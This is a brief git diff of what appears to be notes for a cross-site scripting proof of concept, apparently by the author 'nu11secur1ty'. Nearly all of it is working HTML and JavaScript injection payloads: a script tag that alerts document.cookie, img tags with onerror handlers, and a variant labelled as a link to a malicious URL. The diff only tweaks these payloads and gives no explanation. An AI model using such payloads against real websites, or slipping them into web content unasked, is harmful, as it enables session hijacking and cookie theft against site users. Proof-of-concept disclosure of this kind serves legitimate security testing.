@@ -30,12 +30,13 @@ nu11secur1ty<script>alert(document.cookie)</script>
 ```
 - 0.1
 ```
-</span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif <a href=http://example.com/> onerror=alert(1) /><span>
+</span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif <a href=http://example.com/> onerror=alert(1) /></span>
 ```
-- without error report
+- without error report + link to malicious URL
 
 ```js
-<span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif <a href=http://example.com/>
+<span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif>link<a href=http://example.com/>
+<img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif>link<a href=http://example.com/>
 ```
 ## Error check
 ```
